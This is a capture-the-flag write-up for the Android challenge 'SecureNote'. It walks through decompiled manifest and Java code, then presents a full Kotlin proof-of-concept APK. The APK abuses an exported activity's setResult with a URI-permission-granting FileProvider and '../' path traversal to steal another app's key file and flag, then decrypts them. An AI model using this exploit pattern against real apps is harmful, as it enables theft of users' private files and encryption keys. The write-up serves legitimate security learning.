---
date: '2025-06-30T22:33:06+08:00'
title: 'ICSCTF SecureNote'
tags:
    - Android CTF
    - ICSCTF
---

## Description

> I asked for the challenge from other people so I have no idea what the description is. All I know is this challenge required me to upload my malicious APK into the server
> [SecureNote.apk](static/SecureNote.apk)

## Static Analysis

I started out using `jadx-gui` to decompile and read the code. 

```xml
<activity
    android:name="com.app.rehack.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
<activity
    android:name="com.app.rehack.NoteListActivity"
    android:exported="true"/>
<activity
    android:name="com.app.rehack.AddNoteActivity"
    android:exported="true"/>
<activity
    android:name="com.app.rehack.ViewNoteActivity"
    android:exported="false"/>
<provider
    android:name="com.app.rehack.Utils.FileProvider"
    android:writePermission="false"
    android:enabled="true"
    android:exported="false"
    android:authorities="com.app.rehack"
    android:grantUriPermissions="true">
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/provider_path"/>
</provider>
```

Based on the `AndroidManifest.xml`, there's 4 activities in total but only one activity is not exported. Aside of that, there's a provider with `grantUriPermissions="true"`. Based on [previous challenge](../ICSCTF-Senoparty), this is actually vulnerable so I assume exploit path should be similar. The provider has a `@xml/provider_path` which provide the folder path of the file provider.

```xml
<?xml version="1.0" encoding="utf-8"?>
<paths xmlns:android="http://schemas.android.com/apk/res/android">
    <files-path
        name="files"
        path="."/>
</paths>
```

Based on this, the file provider should be something like `content://com.app.rehack/files/file.txt"`. Moving on, I decided to check for each activity to find potential vulnerable code.

```java
@Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    setContentView(R.layout.activity_add_note);
    final Intent intent = getIntent();
    int intExtra = intent.getIntExtra("total_notes", 0);
    this.editTextNoteName = (EditText) findViewById(R.id.editTextNoteName);
    this.editTextNoteContent = (EditText) findViewById(R.id.editTextNoteContent);
    TextView textView = (TextView) findViewById(R.id.noteCount);
    this.noteTextView = textView;
    textView.setText("Total Notes: " + intExtra);
    this.latestNoteTextView = (TextView) findViewById(R.id.latestNote);
    Button button = (Button) findViewById(R.id.buttonSaveNote);
    this.buttonSaveNote = button;
    button.setOnClickListener(new View.OnClickListener() { // from class: com.app.rehack.AddNoteActivity$$ExternalSyntheticLambda0
        @Override // android.view.View.OnClickListener
        public final void onClick(View view) {
            AddNoteActivity.this.m68lambda$onCreate$0$comapprehackAddNoteActivity(intent, view);
        }
    });
    int latestNote = getLatestNote(intExtra);
    if (latestNote == -1) {
        intent.putExtra("error", "READ_LIST_ERROR");
        setResult(-1, intent);
        finish();
    } else {
        if (latestNote != 0 || intExtra >= 0) {
            return;
        }
        this.latestNoteTextView.setText("No notes available");
    }
}
```

In `AddNoteActivity` activity, there's this vulnerable code `setResult(-1,intent)` which is what I am looking for. To trigger it, I will need to make the `latestNote` to `-1`. It is getting information from `getIntExtra("total_notes", 0);` so I will need to add that into my intent.

```java
package com.app.rehack.Utils;

/* loaded from: classes.dex */
public class FileEncryptor {
    public static native int encrypt(byte[] bArr, byte[] bArr2, byte[] bArr3, byte[] bArr4);

    static {
        System.loadLibrary("rehack");
    }
}
```

```java
package com.app.rehack.Utils;

/* loaded from: classes.dex */
public class FileDecryptor {
    public static native int decrypt(byte[] bArr, byte[] bArr2, byte[] bArr3, byte[] bArr4);

    static {
        System.loadLibrary("rehack");
    }
}
```

Aside of that, I also found 2 native functions that load native library `rehack`. This should be something important as it is used somewhere in the `AddNoteActivity` and `ViewNoteActivity`. 

```java
 File file2 = new File(getFilesDir(), stringExtra + ".txt");
FileInputStream fileInputStream = new FileInputStream(file2);
byte[] bArr = new byte[(int) file2.length()];
byte[] bArr2 = new byte[(int) file2.length()];
fileInputStream.read(bArr);
fileInputStream.close();
Creds creds = Creds.CredsUtil.getCreds(this);
int decrypt = FileDecryptor.decrypt(bArr, creds.key.getBytes(), creds.iv.getBytes(), bArr2);
String str = new String(bArr2, 0, decrypt, StandardCharsets.UTF_8);
if (decrypt >= 0 && NoteEntry.NoteEntryUtil.isPrintable(str)) {
    this.noteTextView.setText(new String(bArr2));
    return;
}
```

Based on this partial code from `ViewNoteActiviy`, it use the `decrypt` native function and it provides information like `creds.key.getBytes()` and `creds.iv.getBytes()` which I assume is AES since AES required this two information. I then look into the `Creds.CredsUtil.getCreds(this)` function.

```java
public class Creds {
    public String iv;
    public String key;

    public static class CredsUtil {
        public static Creds getCreds(Context context) {
            File file = new File(context.getFilesDir(), ".env");
            if (!file.exists()) {
                try {
                    file.createNewFile();
                    FileOutputStream openFileOutput = context.openFileOutput(".env", 0);
                    openFileOutput.write(("<credsConfigRoot><key>" + generateRandomString(16) + "</key><iv>" + generateRandomString(16) + "</iv></credsConfigRoot>").getBytes());
                    openFileOutput.close();
                } catch (Exception e) {
                    Toast.makeText(context, "Error creating .env file", 0).show();
                    e.printStackTrace();
                    return null;
                }
            }
            XStream xStream = new XStream();
            xStream.alias("credsConfigRoot", Creds.class);
            xStream.allowTypes(new Class[]{Creds.class});
            xStream.aliasField("key", Creds.class, "key");
            xStream.aliasField("iv", Creds.class, "iv");
            return (Creds) xStream.fromXML(file);
        }

        public static String generateRandomString(int i) {
            StringBuilder sb = new StringBuilder(i);
            Random random = new Random();
            for (int i2 = 0; i2 < i; i2++) {
                sb.append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(random.nextInt("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length())));
            }
            return sb.toString();
        }
    }
}
```

Based on the code in `Creds`, it basically generating random `key` and `iv` which means that both the `key` and `iv` are dynamic and I will need to extract it manually to decrypt the encrypted content. I then proceed to perform dynamic analysis to understand more on the application.

## Dynamic Analysis

When I run the application at first, it will have some issue the mentioned `READ_LIST_ERROR`.

```java
@Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    setContentView(R.layout.activity_add_note);
    final Intent intent = getIntent();
    int intExtra = intent.getIntExtra("total_notes", 0);
    this.editTextNoteName = (EditText) findViewById(R.id.editTextNoteName);
    this.editTextNoteContent = (EditText) findViewById(R.id.editTextNoteContent);
    TextView textView = (TextView) findViewById(R.id.noteCount);
    this.noteTextView = textView;
    textView.setText("Total Notes: " + intExtra);
    this.latestNoteTextView = (TextView) findViewById(R.id.latestNote);
    Button button = (Button) findViewById(R.id.buttonSaveNote);
    this.buttonSaveNote = button;
    button.setOnClickListener(new View.OnClickListener() { // from class: com.app.rehack.AddNoteActivity$$ExternalSyntheticLambda0
        @Override // android.view.View.OnClickListener
        public final void onClick(View view) {
            AddNoteActivity.this.m68lambda$onCreate$0$comapprehackAddNoteActivity(intent, view);
        }
    });
    int latestNote = getLatestNote(intExtra);
    if (latestNote == -1) {
        intent.putExtra("error", "READ_LIST_ERROR");
        setResult(-1, intent);
        finish();
    } else {
        if (latestNote != 0 || intExtra >= 0) {
            return;
        }
        this.latestNoteTextView.setText("No notes available");
    }
}
```

The error was from this code. After exploring into the details, I noticed that the app did not create `list.xml` on itself. I then proceed to create my own `list.xml` to understand more. After going through the code, I created a sample `list.xml` to make the application work properly.

```xml
<notes>
    <note>
        <name>test</name>
        <file>test.txt</file>
    </note>
</notes>
```

After adding this into `/data/data/com.app.rehack/files/list.xml` with correct permission, everything seems to be working now.


![alt text](img/index.png#center)

Well, I then tried to add a note and see what will happen. After adding it, I look into the directory.

```bash
beryllium:/data/data/com.app.rehack/files # ls -la
total 32
-rw-rw---- 1 u0_a256 u0_a256   87 2025-06-30 23:57 .env
-rw-rw---- 1 u0_a256 u0_a256   16 2025-06-30 23:57 1.txt
```

```xml
<notes>
  <note>
    <file>1.txt</file>
    <name>1</name>
  </note>
</notes>
```

```bash
beryllium:/data/data/com.app.rehack/files # cat 1.txt
=G�ꋴ��D�>A0�82
```

```bash
beryllium:/data/data/com.app.rehack/files # cat .env
<credsConfigRoot><key>1Z7g6WMDc1IpP7gZ</key><iv>78UWIdnw57sJpF7D</iv></credsConfigRoot>
```

Based on these information, I can easily understand that it is performing some kind of encryption which should be AES according to previous assumption. I then tried to decrypt it manually to see if its possible. 

- [CyberChef URL](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'UTF8','string':'1Z7g6WMDc1IpP7gZ'%7D,%7B'option':'UTF8','string':'78UWIdnw57sJpF7D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=UFVmUjZvdTA0L05FclQ1Qk1JbzRNZz09&oeol=CR)

After trying using `CyberChef`, it is possible to decrypt the text in the file using AES decryption. Now that I kind of understand everything, I will just need to extract the `.env` file and potential `flag` file (which I have no idea so i created my own fake flag). I then try my own malicious APK to interact with the challenge APK and extract the information.

### Full POC Code

```kotlin
package io.ks.testingpoc

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.ActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.ui.Modifier
import io.ks.testingpoc.ui.theme.TestingPocTheme
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec
import javax.xml.parsers.DocumentBuilderFactory

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            TestingPocTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    val env1 = remember { mutableStateOf<String?>(null) }
                    val flag = remember { mutableStateOf<ByteArray?>(null) }

                    val startForResult = rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.StartActivityForResult()
                    ) { result: ActivityResult ->
                        val uri = result.data?.data
                        Log.d("IntentDump", "Received result: $result")
                        Log.d("IntentDump", "URI: $uri")

                        uri?.let {
                            try {
                                val content = contentResolver.openInputStream(it)?.use { input ->
                                    input.bufferedReader().readText()
                                }
                                env1.value = content
                            } catch (e: Exception) {
                                Log.e("IntentDump", "Error reading file", e)
                                env1.value = "Error reading .env content"
                            }
                        }
                    }

                    val startForResult2 = rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.StartActivityForResult()
                    ) { result: ActivityResult ->
                        val uri = result.data?.data
                        Log.d("IntentDump", "Received result: $result")
                        Log.d("IntentDump", "URI: $uri")

                        uri?.let {
                            try {
                                val content = contentResolver.openInputStream(it)?.use { input ->
                                    input.readBytes()
                                }
                                flag.value = content
                            } catch (e: Exception) {
                                Log.e("IntentDump", "Error reading file", e)
                            }
                        }
                    }

                    LaunchedEffect(Unit) {
                        val intent = Intent().apply {
                            setClassName(
                                "com.app.rehack",
                                "com.app.rehack.AddNoteActivity"
                            )
                            setData(Uri.parse("content://com.app.rehack/../.env"))
                            putExtra("total_notes", -1)
                            flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
                        }

                        startForResult.launch(intent)

                        val intent2 = Intent().apply {
                            setClassName(
                                "com.app.rehack",
                                "com.app.rehack.AddNoteActivity"
                            )
                            setData(Uri.parse("content://com.app.rehack/../flag.txt"))
                            putExtra("total_notes", -1)
                            flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
                        }

                        startForResult2.launch(intent2)
                    }

                    Column(modifier = Modifier.padding(innerPadding)) {
                        Text(text = "Android")
                        Text(text = "env content: ${env1.value ?: "Loading..."}")
                        Text(text = "flag content: ${flag.value ?: "Loading..."}")
                        env1.value?.let { xml ->
                            flag.value?.let { text ->
                                val (key, iv) = extractKeyIv(xml)
                                val decryptedText = aesDecryptRawInput(text, key, iv)
                                Text("final flag: $decryptedText")
                            }
                        }
                    }
                }
            }
        }
    }
}

fun extractKeyIv(xml: String): Pair<String, String> {
    val doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(xml.byteInputStream())
    val root = doc.documentElement
    val key = root.getElementsByTagName("key").item(0).textContent.trim()
    val iv  = root.getElementsByTagName("iv").item(0).textContent.trim()
    return key to iv
}

fun aesDecryptRawInput(ciphertext: ByteArray, key: String, iv: String): String {
    val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
    val secretKey = SecretKeySpec(key.toByteArray(Charsets.UTF_8), "AES")
    val ivSpec = IvParameterSpec(iv.toByteArray(Charsets.UTF_8))
    cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec)

    val decryptedBytes = cipher.doFinal(ciphertext)
    return String(decryptedBytes, Charsets.UTF_8)
}
```

According to the code, the first thing that it will does it sending intent. In this case, it sent 2 intent to received both the `.env` file and and the `flag.txt` file. The intent purposely include `putExtra("total_notes", -1)` to trigger `setResult(-1, intent);` from `AddNoteActivity`. It will then received the information in the `startForResult` and `startForResult2`. The information will then set into the variable. After everything is done, it will then use the `extractKeyIv` to get the `key` and `iv` from the `env` variable and `aesDecryptRawInput` to retrieve the flag.

![alt text](img/index-1.png#center)

Since I could not access the challenge server, I could not get the real flag but I'm assuming it is something like this. 

## Things I learned from this challenge

- vulnerable code `setResult(-1, intent);` combining with `android:grantUriPermissions="true"` provider
- creating attacker POC APK
- AES decryption